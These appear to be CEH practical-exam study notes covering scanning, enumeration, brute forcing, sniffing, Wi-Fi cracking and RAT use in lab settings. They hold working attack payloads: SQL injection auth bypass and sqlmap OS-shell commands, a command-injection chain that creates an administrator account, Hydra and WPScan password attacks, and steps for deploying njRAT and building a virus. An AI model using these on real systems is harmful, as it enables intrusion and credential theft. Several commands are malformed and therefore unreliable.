#  Scanning Networks (always do sudo su) --> To be root
```
1- Nmap scan for identify live/alive/active hosts/machines command for 192.189.19.18 OR id
nmap -A 192.189.19.0/24 or nmap -T4 -A ip (Aggresive Scan)
Nmap 192.168.19.* or nmap 192.168.19.1/24
2- Zenmap/nmap command for TCP scan - First put the target ip in the Target: and then in the Command: put this command- nmap -sT -v 10.10.10.16
3- Nmap scan if firewall/IDS is opened, half scan- nmap -sS -v 10.10.10.16 
If even this the above command is not working then use this command-  namp -f 10.10.10.16
4- -A command is aggressive scan it includes - OS detection (-O), Version (-sV), Script (-sS) and traceroute (--traceroute).
5- Identify Target system os with (Time to Live) TTL and TCP window sizes using wireshark- Check the target ip Time to live value with protocol ICMP. If it is 128 then it is windows, as ICMP value came from windows. If TTL is 64 then it is linux. Every OS has different TTL. TTL 254 is solaris.
6- Nmap scan for Perform a host discovery scanning and identify the NetBIOS or OS / 
Identify DNS Computer Name / Identify FQDN of the machine / find OpenSSH
you can use nmap -A 192.168.92.10 or nmap -O 192.168.92.10 
(then do search for netbios_computer_name or FQDN)
7- If host is windows then use this command: 
nmap --script smb-os-discovery.nse 192.168.12.22 
(this script determines the OS, computer name, domain, workgroup, time over smb protocol (ports 445 or 139).
8- nmap command for source port manipulation, in this port is given or we use common port-  
nmap -g 80 10.10.10.10
9- nmap -sn 192.168.9.0/24 (Identify the number of host is up or not)
10- nmap -sC -sV -p- -A -v -T4 192.168.9.0/24 (Find Ver. Open Ports)
11- nmap -sC -sV -p- -O -v -A -T4 192.168.9.0/24 (Scripts + Version + Ports + OS Scan)
12- nmap -p 22 -sV 192.168.0.0/24 (Identify version of OpenSSH)
13- nmap -Pn -p -sV 3389 IP (Find IP address of machine with Remote Desktop service)

Nmap provides a wide range of options that control every aspect of its operation. Some of the most commonly used options include:
-p: Specifies which ports you want to scan. You can list individual ports separated by commas or use ranges separated by dashes.
-sS: Initiates a SYN stealth scan, which is less likely to be logged.
-sV: Attempts to determine the version of the services running on open ports.
-O: Enables OS detection.
-A: Enables OS detection, version detection, script scanning, and traceroute.
–script: Enables the use of various scripts from Nmap’s script database for more detailed discovery.
-v: Increases verbosity, providing more information about the scan in progress.

Geo latitude, Longitude
nmap --script ip-geolocation-geoplugin <target>


Identify the number of live machines in 172.16.0.0/24
nmap -sP -PR 172.16.0.0/24

OTHER TOOLS
Identify the number of live machines in 172.16.0.0/24
Angry IP
```

# Enumeration
```
1- NetBios enum using windows- in cmd type- nbtstat -a 10.10.10.10 (-a displays NEtBIOS name table)
2- NetBios enum using nmap- nmap -sV -v --script nbstat.nse 10.10.10.16
3- SNMP enum using nmap-  nmap -sU -p 161 10.10.10.10 (-p 161 is port for SNMP)--> Check if port is open
                               snmp-check 10.10.10.10 ( It will show user accounts, processes etc) --> for parrot
4- DNS enumeration /recon  
dnsrecon -d www.google.com -z
5- FTP enum using nmap-  
nmap -p 21 -A 10.10.10.10 
6- NetBios enum using enum4linux- 
enum4linux -u martin -p apple -n 10.10.10.10 (all info)
enum4linux -u martin -p apple -P 10.10.10.10 (policy info)
PORTS
FTP - 21    |   SNMP - 161 & 162   | UDP - 161   |  SMB - 135, 139,  445   |  RDP - 3389   |  NetBIOS 137    
SAMPLE 2
SNMP Enumeration
Tools used to enumerate: Nmap | snmp-check | metasploit

Ex:
Default UDP ports used by SNMP
Commands: 
nmap -sP 192.151.62.0/24  (to get the target ip add)
nmap -sU 192.151.62.3   (enum the target ip add)
snmp-check 192.151.62.3 (Get System info)

Identify the processes running on the target machine using Nmap scripts
List valid community strings of the server using Nmap scripts
List valid community strings of the server by using snmp_login Metasploit module
msfconsole
search snmp
use auxiliary/scanner/snmp/snmp_login
show options
set RHOSTS 192.151.62.3
exploit

List all the interfaces of the machine. Use appropriate Nmap scripts

SMB Enumeration
Tools used to enumerate: Nmap | snmp-check | metasploit
What to HAck? 
Network File Shares
Logged in Users details
Workgroups
Security level information
Domain and Services

Ex Commands:
Enumeration Shares
nmap <target ip add>
Find port 445 (SMB using port 445)
nmap -p 445 --script smb-enum-shares <target ip add>

Enumeration Users
nmap -p 445 --script smb-enum-users <target ip add>
nmap -p 445 --script smb-enum-users --script-args smbusername=administrator,smbpassword=smbserver_771 <target ip add>

Enumeration Security Level
nmap -sC -sV -A -T4 <target ip add>

Enumeration Services
nmap -p 445 --script smb-enum-services --script-args smbusername=administrator,smbpassword=smbserver_771 <target ip add>

Exploiting RDP Service
How to Exploit?
Check for running services on the target and confirm if RDP is running on any open port
nmap <target ip add>
Use Metasploit to confirm the services running RDP
msfconsole -q (to view help commands)
search rdp
use auxiliary/scanner/rdp/rdp_scanner
set RHOSTS 10.5.17.119
set RPORT 3333
exploit
Use Hydra to brute force the login credentials
(see above on other category for example)
Use and RDP Tools to login into victim machine

Identify if the website www.certifiedhacker.com allows DNS zone transfer.
ParrotOS: dig ns www.certifiedhacker.com axfr

Perform LDAP enumeration on the target network and find out how many user accounts are associated with the domain.
Nmap -p 389 –script ldap-brute –script-args ldap.base=’”cn=users,dc=CEHORG,dc=com”’ 10.10.10.25 (target machine)

Perform an LDAP Search on the Domain Controller machine and find out the latest version of the LDAP protocol

Find the IP address of the machine running SMTP service on 192.168.0.0/24
nmap -p 25 192.168.0.0/24
```
#  Quick Overview (Stegnography) --> Snow , Openstego
```
1- Hide Data Using Whitespace Stegnography- snow -C -m "My swiss account number is 121212121212" -p "magic" readme.txt readme2.txt  (magic is password and your secret is stored in readme2.txt along with the content of readme.txt)
2- To Display Hidden Data- snow -C -p "magic" readme2.txt (then it will show the content of readme2.txt content)
3- Image Stegnography using Openstego- PRACTICE ??
```
#  Sniffing
```
1- Password Sniffing using Wireshark- In pcap file apply filter: http.request.method==POST (you will get all the post request) Now to capture password click on edit in menu bar, then near Find packet section, on the "display filter" select "string", also select "Packet details" from the drop down of "Packet list", also change "narrow & wide" to "Narrow UTF-8 & ASCII", and then type "pwd" in the find section.
```
#  Hacking Web Servers
```
1- Footprinting web server Using Netcat and Telnet- nc -vv www.movies.com 80
						    GET /HTTP/1.0
						    telnet www.movies.com 80
						    GET /HTTP/1.0
2- Enumerate Web server info using nmap-  nmap -sV --script=http-enum www.movies.com
3- Crack FTP credentials using nmap-  nmap -p 21 10.10.10.10 (check if it is open or not)
				      ftp 10.10.10.10 (To see if it is directly connecting or needing credentials)
Then go to Desktop and in Ceh tools folder you will find wordlists, here you will find usernames and passwords file.
Now in terminal type-  hydra -L /home/attacker/Desktop/CEH_TOOLS/Wordlists/Username.txt -P /home/attacker/Desktop/CEH_TOOLS/Wordlists/Password.txt ftp://10.10.10.10

hydra -l user -P passlist.txt ftp://10.10.10.10
```
#  Hacking Web Application
```
1- Scan Using OWASP ZAP (Parrot)- Type zaproxy in the terminal and then it would open. In target tab put the url and click automated scan.
2- Directory Bruteforcing- gobuster dir -u 10.10.10.10 -w /home/attacker/Desktop/common.txt
3- Enumerate a Web Application using WPscan & Metasploit BFA-  wpscan --url http://10.10.10.10:8080/NEW --enumerate u  (u means username) 
Then type msfconsole to open metasploit. Type -  use auxilliary/scanner/http/wordpress_login_enum
 						 show options
						 set PASS_FILE /home/attacker/Desktop/Wordlist/password.txt
						 set RHOSTS 10.10.10.10  (target ip)
						 set RPORT 8080          (target port)
						 set TARGETURI http://10.10.10.10:8080/
						 set USERNAME admin
4- Brute Force using WPscan -    wpscan --url http://10.10.10.10:8080/NEW -u root -P passwdfile.txt (Use this only after enumerating the user like in step 3)
			         wpscan --url http://10.10.10.10:8080/NEW --usernames userlist.txt, --passwords passwdlist.txt 
5- Command Injection-  | net user  (Find users)
 		       | dir C:\  (directory listing)
                       | net user Test/Add  (Add a user)
		       | net user Test      (Check a user)
		       | net localgroup Administrators Test/Add   (To convert the test account to admin)
		       | net user Test      (Once again check to see if it has become administrator)
Now you can do a RDP connection with the given ip and the Test account which you created.
```
#  SQL Injections
```
1- Auth Bypass-  hi'OR 1=1 --
2- Insert new details if sql injection found in login page in username tab enter- blah';insert into login values('john','apple123');--
3- Exploit a Blind SQL Injection- In the website profile, do inspect element and in the console tab write -  document.cookie
Then copy the cookie value that was presented after this command. Then go to terminal and type this command,
sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --dbs
4- Command to check tables of database retrieved-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename --tables
5- Select the table you want to dump-  sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" -D databasename -T Table_Name --dump   (Get username and password)
6- For OS shell this is the command-   sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that you copied and don't remove square brackets]" --os-shell
6.1 In the shell type-   TASKLIST  (to view the tasks)
6.2 Use systeminfo for windows to get all os version
6.3 Use uname -a for linux to get os version

NOTES or SHORTCUT:
sqlmap -h (help list)
sqlmap -hh (complete help list)

IDOR (View Profile)
Example:
After Auth Bypass or use given credentials, go to view profile
Example: www.test.com/viewprofile.aspx?id=1

Then keep changing the id number until you find the right user!


```
# Android
```
1- nmap ip -sV -p 5555    (Scan for adb port)
2- adb connect IP:5555    (Connect adb with parrot)
3- adb shell              (Access mobile device on parrot)
4- pwd --> ls --> cd sdcard --> ls --> cat secret.txt (If you can't find it there then go to Downloads folder using: cd downloads)

ADDITIONAL NOTES:
adb pull /sdcard/scan (Command to copy folder to your device and create a folder name scan) or
adb pull /sdcard/scan Desktop/ (Command to copy folder to your device and save it to Desktop)

Sample Q:
On android device there is a secret code, what is inside the code?
Scan the environment using namp or zenmap
Find the host that have port 5555 (Port 5555 is Android)

To check file entropy
Use command:
ent -h (to check whether ent already install or not yet) (IF tool not install use this command to install: apt install ent)
Ent <filename> (To check file entropy)

To obtain the last 4 digits of SHA 384 hash
Use command:
sha384sum --help (to check whether ent already install or not yet)
sha384sum <filename>


```
# Wireshark
```
tcp.flags.syn == 1 and tcp.flags.ack == 0    (How many machines) or Go to statistics IPv4 addresses--> Source and Destination ---> Then you can apply the filter given
tcp.flags.syn == 1   (Which machine for dos)
http.request.method == POST   (for passwords) or click tools ---> credentials

Ex: pcap for DDOS- identify how many total attacking machines
Then Go to tab statistics > IPv4 statistics--> Source and Destination ---> Then you can paste on the Display filer
tcp.flags.syn == 1 and tcp.flags.ack == 0
Result will come out and the most Count will be the attacker ip add, so if you have Source ip add that have 3 digits Count, those most likely your attacker machines
Ex: pcap for DOS- identify attacking ip
COPY:
tcp.flags.syn == 1   (Which machine for dos) OR tcp.flags.syn == 1 and tcp.flags.ack == 0
Then Go to tab statistics > IPv4 statistics--> Source and Destination ---> Then you can paste on the Display filer

Result will come out and the most Count Source IPv4 Addresses will be the attacker ip add, so if you have Source ip add that have 3 digits Count, those most likely your attacker machines


Ex: DOS pcap file for login credentials
Retrieve username and password from Wireshark
Run Wireshark, then paste below on the filter field.
http.request.method == POST   (for passwords) or click tools ---> credentials

Click on the result and then click Hypertext Transfer Protocol OR right click > Follow > TCP Stream

Ex: Find a text file
Go to File > Export Objects > HTTP
Sort it using Content Type
Once found the file, you can Save it by click the Save button on the bottom right

Ex: Find a comment
Select the file and go to bottom left, there’s an icon with notepad and pen

Ex: Find/Search String
Ctrl F
Then an option String will appear at the top, then you can fill up what you want to search (its case sensitive)
Ex: Analyse DOS attack
Review the tab info
Go to Statistic tab > Conversations 
Filter by bytes (find the highest Bytes

Ex Scenario
If .pcapng given, then the steps will be:
Open Wireshark > Open recent file (find the file given and open it)
Go to Statistic tab > Conversations
Go to IPv4 tab > sort it by Packets
Then the highest value of packets will be most likely the IP address A of the source of Attacker (or Address B the source of Target)  
```
# Find FQDN
```
nmap -p389 –sV -iL <target_list>  or nmap -p389 –sV <target_IP> (Find the FQDN in a subnet/network)
```
# Cracking Wi-Fi networks
```
Cracking Wifi Password using Aircrack-ng (ParrotOS)
Open Terminal, then:

(For cracking WEP network)
aircrack-ng [pcap file] 

(For cracking WPA2 or other networks through the captured .pcap file) (You can drag and drop the file after command aircrack-ng -a2 -b [Target BSSID] -w) 
aircrack-ng -a2 -b [Target BSSID] -w [password_Wordlist.txt] [WP2 PCAP file] 

-a is the technique used to crack the handshake, 2=WPA technique
-b refers to bssid; replace with the BSSID of the target router
-w stands for wordlist; provide the path to a wordlist

Target BSSID can be found from the .cap/.pcap file, just double click the file, it will open with Wireshark
Then on the second screen, find the word BSS id: then you will find the BSSID inside ()
Then continue the process to ParrotOS, then choose which you are about to crack WEP or WPA2 above

```
#  Some extra work 
```
Check RDP enabled after getting ip- nmap -p 3389 -iL ip.txt | grep open (ip.txt contains all the alive hosts from target subnet)
Check MySQL service running- nmap -p 3306 -iL ip.txt | grep open        (ip.txt contains all the alive hosts from target subnet)
```
#  Cryptography 
```
TOOLS FOR ENCODE / DECODE

BCTextEncoder (Win) For encoding and decoding text in file (.hex)
Ex: decode the file and extract the ip add of compromised machine
Encode = Fill up the field form and press Encode 
Decode = vice versa

Veracrypt (Win) For hiding and Encrypting the disk partitions
Steps:
Download > Install
Create Volume > Create an encrypted file container >Standard VeraCrypt volume
Volume Location (Select File > Desktop > Any file name)
Next > Leave it default > Add Volume Password > Next > Yes
Mouse your mouse randomly
Then Click Format > Exit

To open encrypted file
Mount by Choose any Volume > Create Volume
Select File (Encrypted file) > Use the password above you created

CrypTool(Win) For encryption/decryption of the hex data - by manipulating the key length
Decrypted using CrypTool
Open the app > Go to tab Ecrypt/Decrypt
Choose Symetric (modern) > Choose the key depend on the questions either RC4 or 
DES (ECB)
If on the Q mentioned the key length, then fill it else choose default and click Decrypt


Hashmyfiles (For calculating and comparing hashes of files) (Win)
Simply drag and drop the file to the program
Pink colour mean data is same, same hash
White colour mean data is tampered, different data & hash

CryptoForge (For encrypting and decrypting the files)

Cryp tool
Example to Open the file cryt-128–06encr.hex containing ransom file password
```
#  Steganography 
```
Snow (Win) (For hiding & extracting hidden data from a text file)
Download from: darkside.com.au/snow > Install snwdos32.zip > only need SNOW.exe
Commands (Hidden data):
Open the folder where the snow installed, then
SNOW.EXE -C -m “This is secret msg” -p “P@ssword” Secret.txt Hiddensecret.txt

Commands (Extract data):
SNOW.EXE -C -p “P@ssword” Hiddensecret.txt
Openstego (Win) (For hiding & extracting hidden data from a image file)
Open image with Openstego
Choose Extract data:
Input stego file: Choose the file image
Output folder: (choose where you want to save it)

Covert TCP (For hiding data in TCP/IP packet header)
Download covert_tcp.c from internet 
(For receiving/listening:)
./covert_tcp -dest <dest-ip> -source <source-ip> -source_port 9999 -dest_port 8888 -server -file /path/to/file.txt

(For sending:)
./covert_tcp -dest <dest-ip> -source <source-ip> -source_port 8888 -dest_port9999 -file /path/to/file.txt

How to use:
Open ParrotOS (On Sender machine)
sudo su
cc -o covert_tcp covert_tcp.c
./covert_tcp -source <Sender machine ip add> -dest <Receiver machine> -source_port 9999 -dest_port 8888 -file secret.txt

Open ParrotOS (On Receiver machine)
sudo su
cc -o covert_tcp covert_tcp.c
./covert_tcp -source <Sender machine ip add> -source_port 8888 -server -file receive.txt

```

#  CVE, CVSS & NVD 
```
Ex: Perform a vulnerability scan for the host with ip add 192.168.0.1, what is the CVE score that indicate EOL of web dev language platform.

nmap --Pn --script vuln 192.168.0.1 (scan vulnerability of the target)
Once got the result, get the CVE id that End of Live and then search the CVE id on google (Here you will get the CVE score)

If EOL most likely the CVE score is 10

```

#  Malware Threats
 
```
RAT | njRAT | TheftRAT
It use for control the target machine (find the program from Trojan Types > Remote Access Trojans RAT)

Steps:
Run njRat on the host
Click Builder tab (bottom of the screen) > Enter the host ip add (make sure  tick Registry StarUp), then click Build
Save the .exe > Copy it to Target machine (Use the share folder) 
Login to Target machine > Run the .exe
Back to the ATTACKER Machine > Go to NJRAT
Right click on the machine name and then you can do different options such Manager, Services, RDP, etc
Create a Trojan Server using: Theef RAT Trojan (Win)
It allows remote attacker access to the system via port 9871 and 6703
Steps:
On the Target Machine: Go to Share folder  (Location: Malware Threats>Trojans Types>RAT) and Run the Server210.exe

On the Attacker Machine: Run Client210.exe
Add the Target ip add, port 6703 FTP 2968 > Click Connect

Create a Virus using the JPS Virus Maker Tool and Infect the Target System: 
On the Attacker Machine: Go to the shared folder and find JPS Virus Maker Tool and Create the Virus accordingly.
On the Target Machine: Run the virus

Other Tools
MoSucker
ProRAT
HTTP RAT

How to use ProRAT
Open ProRAT > Enter the Target IP add, port 5110 > then click Connect
Click Search Files (to find the secret.txt, check on .\Users or .\Download)

```
#  Malware Analysis
 
```
Is it Keylogger, RAT or Ransomware? How was the system infected? Is it Target or Phishing? 
How does it communicates with the attacker?

Malware Scanning using Hybrid Analysis (Web)

Perform a Strings Search using BinText (Win) (Malware Analysis Tools > String Searching Tools)

Identify Packaging and Obfuscation Methods using PEid (Win) (Malware Analysis Tools > Static Malware Analysis Tools > Packaging & Obfuscation Tools>PEid)
Go to Viruses folder and > Use Klez Virus Live

Analyze ELF Executable File using Detect It Easy (DIE) (WIN)

Location: Malware Analysis Tools> Static Malware,... > Packaging and Obfuscation,.. > DIE
Run DIE
Then, On the right hand side File info tab, you can find info such as entropy

Other Tools:
Macro_Pack
UPX - https://upx.github.io
ASPPack http://www.aspack.com

Find the Portable Executable (PE) Information of a Malware Executable File using PE Explorer

Identify File Dependencies using Dependency Walker
Perform Malware Disassembly using OllyDbg
```

#  IoT 
```
Analysing MQTT (IoT)
Capture and Analyze IoT Traffic
Setup IoT Brooker > Setup an IoT device simulator > Publish message > Analyze message in Wireshark
Tool: Bevywise IoT simulator (Win)
Install MQTTRouter.exe on the Host

Install IoT Simulator.exe on the Target
Double click runsimulator.bat, it will open the edge for the IoT Simulator portal
Create New Network
Add Broker IP Address (Target ip add) > Save
Create New Device > Give a name & Device id > Save
Start the network (top right)

Create Topic
Click + sign to add (top right) > Subscribe to Command 
(Give Topic a name) > Qos (choose 1)

Run Wireshark
Select Ethernet (it will start capturing packets)

Goto Target machine > Open Chrome, type http://localhost:8080 (creds: admin admin)

Goto Wireshark, stop the capture > type mqtt on the filter
Select Publish message

```
#  OpenVAS
```
Ex1. Perform vulnerability scanning using OpenVAS and identify the number of vulnerabilities?
Open Parrot OS > Application and search for OpenVAS

Ex2.Perform vulnerability for webserver and identify the severity of RPC?
Host > click the host
Under Source > Click Report link 
On the icons , find corresponding vulnerabilities 
Find RPC

Ex3.Perform vulnerability on Linux host network using OpenVAS and find how many vulnerability?
Scan the network using nmap to find the host that using Linux, once you find the ip address, use openVAS to do vulnerability scan (Click the wizard icon at top left, then enter the ip address)
Once Scan completed, Click Done > click Results tab
```


#  MISC 
```
Find IP address, Active Host, Ports: 
Win: ipconfig
Linux: ifconfig

Find IP Add Using Netdiscover
TOOLS: ParOS (Always Sudo Su) - NetDiscover
Netdiscover -r 192.168.77.0/24

Linux commands
Ls = to list
Nano to input.txt = to modify text input.txt

Scan the host without waiting response  
Nmap -Pn

pwd (Print Working Directory) 
cat text.text (To view inside the text file)

Windows commands
Net user = to verify registered account in a machine 

RDP port 3389
FTP examples
Example: 
Open CMD
ftp 10.10.10.1 (to connect)
Then after connected to the FTP, go to the file
get secret.txt (to get .txt file)

Privilege Escalation
Horizontal Privilege Escalation
ParrotOS: 
ssh user1@<target ip> -p 50706
Response yes > Enter the password

Try find a way to move to ‘user2’, to get the flag in ‘/home/user2/flag.txt’
cd /home/user2
Cat flag.txt
sudo -u user2 /bin/bash (login as user2)

Vertical Privilege Escalation (VPE)
Ex: You gave a subnet 10.10.0.0/24 and user credentials as well. You are instructed to access the target machine and perform VPE escalation to that user and enter the content of text.txt as the answer.
nmap -sV -p 22 10.10.0.0/24
ssh kali@10.10.0.0 (ssh connection)
Then enter the password
sudo -l (to list what command you can run)
sudo -i (use the credentials given)
cd /
Find . -name <text.txt> 
(Once you’ve got the path on where the text.txt is) 
cat /home/kali/Documents/text.txt

Local Privilege Escalation
Remote Privilege Escalation

What are the commands to find the ip address of a Linux and a Windows machine?
Linux- ifconfig
Windows- ipconfig
Which command allows you to manage user accounts on a Windows computer ?
net user
What is the Port for Remote Desktop Protocol (RDP) ?
Port for RDP is TCP 3389
Write the nmap command to find the OS for the following device, 192.168.16.9 ?
nmap  -O 192.168.16.9     
Write the nmap command to find out the services running on port 3000  for the following IP (172.16.20.5) ?
nmap -sV -p 3000 172.16.20.5

RDP
RDP port 3389
Ex: Given 4 valid employees, Find Suspicious account
RDP to the machine
Open CMD > net user
The users that not on the list, must be the attacker

Nmap -Pn -p -sV 3389 IP (to find IP add of machine that have RDP port open)

Convert Nmap XML file
Xsltproc <nmap-output.xml> -o <nmap-output.html>

MD5 HASH
Use HashCal (WIN)

NTLM Password Hash Decrypted
Go to this site: https://md5decrypt.net/en/Ntlm/

Copy and paste the hash keys only after : 
```
